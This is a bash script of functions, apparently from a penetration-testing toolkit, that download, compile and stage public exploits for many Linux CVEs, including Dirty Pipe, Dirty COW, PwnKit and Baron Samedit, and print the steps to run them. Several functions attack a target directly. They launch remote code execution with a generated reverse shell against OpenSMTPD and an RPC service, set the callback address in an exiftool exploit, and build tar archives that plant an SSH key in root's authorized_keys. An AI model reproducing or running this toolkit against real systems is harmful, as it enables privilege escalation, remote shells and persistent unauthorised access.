#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")

perform_cve_2017_16995() {
    local target_os=$1
    if [ -z "$target_os" ]; then
        target_os="ubuntu:16.04"
    fi
    local cve_dir="CVE-2017-16995"
    local cve_filename="cve_2017_16995"
    cve_filename=$(get_compression_filename "$cve_filename")
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd $cve_dir || exit 1
    if [ ! -f "45010.c" ]; then
        wget "https://www.exploit-db.com/download/45010" -O 45010.c
    fi
    local exploit_executable="45010"
    if [ ! -f "$exploit_executable" ]; then
        echo "$exploit_executable binary not found, compiling..."
        echo "all:" > Makefile
        echo -e "\tgcc -o $exploit_executable 45010.c" >> Makefile
        compile_cpp
    else
        echo "$exploit_executable binary already exists, skipping compilation. Remove it first if you want to recompile."
    fi
    popd || exit 1
    if [[ -f $cve_filename ]]; then
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_exploit_download

}

#=================
#pwnkit
#=================

perform_cve_2021_4034() {

    local cve_filename="cve_2021_4034"
    cve_filename=$(get_compression_filename "$cve_filename")
    local cve_dir="CVE-2021-4034"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [ ! -f 50689.txt ]; then
        searchsploit -m 50689
    fi
    if [ ! -f Makefile ]; then
        echo "Makefile not found, extracting from 50689.txt..."
        awk '
            /^[#]+ Makefile/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > Makefile
    fi

    if [ ! -f evil-so.c ]; then
        echo "evil-so.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ evil-so.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > evil-so.c
    fi
    if [ ! -f exploit.c ]; then
        echo "exploit.c not found, extracting from 50689.txt..."
        awk '
            /^[#]+ exploit.c/ {
                while ((getline) > 0 && !/^[#]+$/) {
                    print
                }
                next
            }
        ' 50689.txt > exploit.c
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        if [ ! -f exploit ]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    generate_exploit_download    

}

perform_cve_2021_3560() {
    #local url="https://raw.githubusercontent.com/f4T1H21/CVE-2021-3560-Polkit-DBus/refs/heads/main/poc.sh"
    #wget "$url" -O cve_2021_3560.sh
    echo 'Check for the following'
    echo 'apt list --installed | grep gnome-control-center'
    echo 'apt list --installed | grep accountsservice'
    if [[ ! -f "50011.sh" ]]; then
        searchsploit -m 50011
    fi
    cp 50011.sh cve_2021_3560.sh
    generate_linux_download "cve_2021_3560.sh"
}

#=============
#sudo baron
#=============

perform_cve_2021_3156() {
    local download_url="https://codeload.github.com/blasty/CVE-2021-3156/zip/main"
    local cve_dir="CVE-2021-3156"
    local cve_filename="cve_2021_3156"
    cve_filename=$(get_compression_filename "$cve_filename")
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        mv "CVE-2021-3156-main" "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == "true" ]]; then
        echo "Compiling exploit..."
        local exploit_executable="sudo-hax-me-a-sandwich"
        if [[ ! -f "$exploit_executable" ]]; then
            compile_cpp
        fi
        popd || exit 1
    fi
    if [[ -f "$cve_filename" ]]; then
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo 'make'
    echo "./$exploit_executable"
}


perform_cve_2021_22555() {
    local download="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c"
    local cve_filename=$(get_compression_filename "cve_2021_22555")
    local cve_dir="CVE-2021-22555"
    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -m32 -static -o $exploit_executable -Wall exploit.c" >> Makefile
            extra_packages="gcc-multilib"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    rm $cve_filename
    compress_file "$cve_filename" "$cve_dir"
    generate_download_linux $cve_filename
    get_uncompress_command "$cve_filename"

}

# nft object UAF
# specific to ubuntu 22.04 or somewhat newer versions
# older versions will not compile because it does not have NFT_EXPR

perform_cve_2022_32250() {
    local download_url="https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c"
    local cve_filename=$(get_compression_filename "cve_2022_32250")
    local cve_dir="CVE-2022-32250"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exp.c" ]]; then
        wget "$download_url" -O "exp.c"
    fi
    if [[ ! -z "$compile_exploit" ]] && [[ "$compile_exploit" == "true" ]]; then
        local exploit_executable="exp"
        if [ ! -f "$exploit_executable" ]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -o exp exp.c -lmnl -lnftnl -w -Wno-error=implicit-function-declaration" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            target_os="ubuntu:22.04"
            compile_cpp
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exp"
}

# specific to ubuntu 22.04 or somewhat newer versions
# https://ubuntu.com/security/CVE-2022-2586
# confirm libmnl and libnftnl are installed

perform_cve_2022_2586() {
    local download_url="https://www.openwall.com/lists/oss-security/2022/08/29/5/1"
    local cve_filename=$(get_compression_filename "cve_2022_2586")
    local cve_dir="CVE-2022-2586"
    echo 'Ensure you check the following packages are installed:'
    echo 'apt list --installed | grep libmnl'
    echo 'apt list --installed | grep libnftnl'
    echo 'sysctl kernel.unprivileged_userns_clone'

    if [ ! -d "$cve_dir" ]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "exploit.c" ]]; then
        wget "$download_url" -O "exploit.c"
    fi
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc exploit.c -lmnl -lnftnl -no-pie -lpthread -w -o $exploit_executable" >> Makefile
            extra_packages="libmnl-dev libnftnl-dev"
            target_os="ubuntu:22.04"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exploit"
}

#=========================
# Dirty pipe
# https://dirtypipe.cm4all.com/
#=========================

perform_cve_2022_0847() {
    local download_url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip"
    local cve_dir="CVE-2022-0847"
    cve_filename=cve_2022_0847
    local cve_filename=$(get_compression_filename "$cve_filename")

    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "CVE-2022-0847-DirtyPipe-Exploits-main" "$cve_dir"
    fi

    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        if [[ ! -f "exploit-1" ]] || [[ ! -f "exploit-2" ]]; then
            echo "Compiling exploit..."
            make_command="chmod a+x compile.sh; ./compile.sh"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "chmod a+x compile.sh"
    echo "./compile.sh"
    echo "./exploit-1"
    echo "./exploit-2"  
}


# 20.04 make_command="make groovy"
# 21.04 make_command="make hirsute"
#
perform_cve_2021_3490() {
    local download_url="https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main"
    local cve_dir="CVE-2021-3490"
    local cve_filename=$(get_compression_filename "cve_2021_3490")
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip -n "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "Linux_LPE_eBPF_CVE-2021-3490-main" "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm "$cve_filename"
    fi
    compress_file "$cve_filename" "$cve_dir"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd $cve_dir"
    echo "make"
    echo "./exploit"
}

# specific to ubuntu 18.04
# https://www.exploit-db.com/exploits/45886
# note that you will need to modify the source code

perform_cve_2018_18955() {
    local download_url="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/45886.zip"
    local cve_dir="CVE-2018-18955"
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip -n "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv "CVE-2018-18955-main" "$cve_dir"
    fi
    pushd "$cve_dir/45886" || exit 1
    if [[ ! -z "$compile_exploit" ]]; then
        local exploit_executable="subuid_shell"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all: subuid_shell subshell" > Makefile
            echo "subuid_shell:" >> Makefile
            echo -e "\tgcc -o subuid_shell subuid_shell.c" >> Makefile
            echo "subshell:" >> Makefile
            echo -e "\tgcc -o subshell subshell.c" >> Makefile
            target_os="ubuntu:18.04"
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    local cve_filename=$(get_compression_filename "cve_2018_18955")
    if [[ -f "$cve_filename" ]]; then
        echo "Removing existing $cve_filename"
        rm $cve_filename
    fi
    compress_file "$cve_filename" "CVE-2018-18955"
    generate_linux_download "$cve_filename"
    get_uncompress_command "$cve_filename"
    echo "cd CVE-2018-18955/45886"
    echo "make"
    echo "./subuid_shell"
    echo "./subshell"
}

perform_cve_2019_13272() {
    local download_url="https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c"
    local cve_dir="CVE-2019-13272"
    if [[ -z $target_os ]]; then
        target_os="debian:9.0"
    fi
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
        wget "$download_url" -O "$cve_dir/poc.c"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == "true" ]]; then
        local exploit_executable="exploit"
        echo "all:" > Makefile
        echo -e "\tgcc -o $exploit_executable poc.c" >> Makefile
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    generate_exploit_download

}



perform_cve_2020_7247() {
    if [[ ! -d "CVE-2020-7247" ]]; then
        mkdir "CVE-2020-7247"
    fi
    pushd "CVE-2020-7247" || exit 1
    if [[ ! -f 48051.pl ]]; then
        searchsploit -m 48051
    fi
    cp 48051.pl temp.pl
    sed -E -i 's/exec "nc -vlp/#exec "nc -vlp/g' temp.pl
    sed -E -i 's/exec "nc -vl /#exec "nc -vl /g' temp.pl    
    if [[ ! -z $host_port ]]; then
        sed -E -i 's/\$lport = .*;/\$lport = '$host_port';/g' temp.pl
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default: $target_ip"
    fi
    if ! is_listener_connected; then
        perl temp.pl RCE $target_ip $host_ip
    fi
    popd || exit 1

}

perform_cve_2020_7247_alt() {
    if [[ ! -d "CVE-2020-7247" ]]; then
        mkdir "CVE-2020-7247"
    fi
    pushd "CVE-2020-7247" || exit 1
    if [[ ! -f 47984.py ]]; then
        searchsploit -m 47984
    fi
    if [[ -z $target_ip ]]; then
        target_ip=$ip
        echo "target_ip is not set, using default: $target_ip"
    fi
    if [[ -z $target_port ]]; then
        target_port=25
        echo "target_port is not set, using default: $target_port"
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
        cmd=$(encode_bash_payload "$cmd")
        echo "cmd is not set, using default: $cmd"
    fi
    python 47984.py $target_ip $target_port "$cmd"
    popd || exit 1    
}

# dirty cow

perform_cve_2016_5195 () {
    local cve_dir="CVE-2016-5195"
    local url="https://github.com/firefart/dirtycow/archive/refs/heads/master.zip" 
    if [[ ! -d "$cve_dir" ]]; then
        wget "$url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv dirtycow-master "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
        local exploit_executable="dirty"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -o $exploit_executable dirty.c -pthread -lcrypt" >> Makefile
            if [[ -z $target_os ]]; then
                target_os="ubuntu:16.04"
            fi
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    generate_exploit_download

}

perform_cve_2022_35411() {
    local cve_dir="CVE-2022-35411"
    local download_url="https://github.com/ehtec/rpcpy-exploit/raw/refs/heads/main/rpcpy-exploit.py"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f "rpcpy-exploit.py" ]]; then
        wget "$download_url" -O "rpcpy-exploit.py"
    fi
    if [[ -z $cmd ]]; then
        cmd=$(get_bash_reverse_shell)
    fi
    local exec_command=""
    exec_command=$(escape_sed "$cmd")
    sed -E -i "s/exec_command\('.*'\)/exec_command\('$exec_command'\)/g" rpcpy-exploit.py
    popd || exit 1
    generate_exploit_download
    echo 'python3 rpcpy-exploit.py'
}

#exiftool exploit
perform_cve_2021_22204 () {
    local cve_dir="CVE-2021-22204"
    local download_url="https://github.com/convisolabs/CVE-2021-22204-exiftool/archive/refs/heads/master.zip"
    if [[ ! -d "$cve_dir" ]]; then
        wget "$download_url" -O "$cve_dir.zip"
        unzip "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv CVE-2021-22204-exiftool-master "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    sed -E -i "s/ip = .*/ip = '$host_ip'/g" exploit.py
    sed -E -i "s/port = .*/port = '$host_port'/g" exploit.py
    python3 exploit.py
    popd || exit 1
    generate_exploit_download
}

#tar exploit
perform_cve_2024_12905() {
    local cve_dir="CVE-2024-12905"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f 52268.py ]]; then
        searchsploit -m 52268
    fi
    if [[ -z $target_file ]]; then
        if [[ ! -f authorized_keys ]]; then
            ssh-keygen -t rsa -b 2048 -f id_rsa -q -N ""
            chmod 600 id_rsa
            cat id_rsa.pub > authorized_keys
            chmod 600 authorized_keys
        fi
        target_file="authorized_keys"
        echo "target_file is not set, using default: $target_file"
    fi
    if [[ -z $target_path ]]; then
        target_path="/root/.ssh/authorized_keys"
        echo "target_path is not set, using default: $target_path"
    fi
    rm normal_file
    if [[ -f stage_1.tar ]]; then
        rm stage_1.tar
    fi
    if [[ -f stage_2.tar ]]; then
        rm stage_2.tar
    fi
    python 52268.py "$target_file" "$target_path"
    popd || exit 1
    cp "$cve_dir/id_rsa" .
    cp "$cve_dir/stage_1.tar" .
    cp "$cve_dir/stage_2.tar" .

}

perform_cve_2016_8655() {
    local cve_dir="CVE-2016-8655"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f 40871.c ]]; then
        searchsploit -m 40871
    fi
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc -o $exploit_executable 40871.c -lpthread" >> Makefile
            if [[ -z $target_os ]]; then
                target_os="ubuntu:16.04"
            fi
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    generate_exploit_download
}

perform_cve_2016_4557() {
    local cve_dir="CVE-2016-4557"
    local url="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip"
    if [[ ! -d "$cve_dir" ]]; then
        wget "$url" -O "$cve_dir.zip"
        unzip -n "$cve_dir.zip"
        rm "$cve_dir.zip"
        mv 39772/exploit.tar .
        rm -rf 39772
        rm -rf _MACOSX
        tar xvf exploit.tar
        rm exploit.tar
        mv ebpf_mapfd_doubleput_exploit $cve_dir
    
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
        local exploit_executable="doubleput"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all: $exploit_executable hello suidhelper" > Makefile
            echo "hello:" >> Makefile
            echo  -e "\tgcc -o hello hello.c -Wall \`pkg-config fuse --cflags --libs\`" >> Makefile
            echo "suidhelper:" >> Makefile
            echo  -e "\tgcc -o suidhelper suidhelper.c -Wall" >> Makefile
            echo "$exploit_executable:" >> Makefile
            echo  -e "\tgcc -o $exploit_executable $exploit_executable.c -Wall" >> Makefile
            echo "clean:" >> Makefile
            echo -e "\trm -f hello suidhelper $exploit_executable" >> Makefile
            extra_packages="libfuse-dev pkg-config"
            if [[ -z $target_os ]]; then
                target_os="ubuntu:16.04"
            fi
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    generate_exploit_download
}

perform_cve_2015_1328() {
    local cve_dir="CVE-2015-1328"
    if [[ ! -d "$cve_dir" ]]; then
        mkdir "$cve_dir"    
    fi
    pushd "$cve_dir" || exit 1
    if [[ ! -f 37292.c ]]; then
        searchsploit -m 37292
    fi

    if [[ -z $target_architecture ]]; then
        target_architecture="x86_64"
    fi
    local arch_flag=""
    if [[ $target_architecture == "i686" ]] || [[ $target_architecture == "x86" ]]; then
        arch_flag="-m32"
        extra_packages="gcc-multilib"
    fi    
    if [[ ! -z "$compile_exploit" ]] && [[ $compile_exploit == true ]]; then
        local exploit_executable="exploit"
        if [[ ! -f "$exploit_executable" ]]; then
            echo "Compiling exploit..."
            echo "all:" > Makefile
            echo -e "\tgcc $arch_flag -o $exploit_executable 37292.c" >> Makefile
            if [[ -z $target_os ]]; then
                target_os="ubuntu:15.04"
            fi
            compile_cpp
        else
            echo "Exploit already compiled, skipping compilation."
        fi
    fi
    popd || exit 1
    generate_exploit_download

}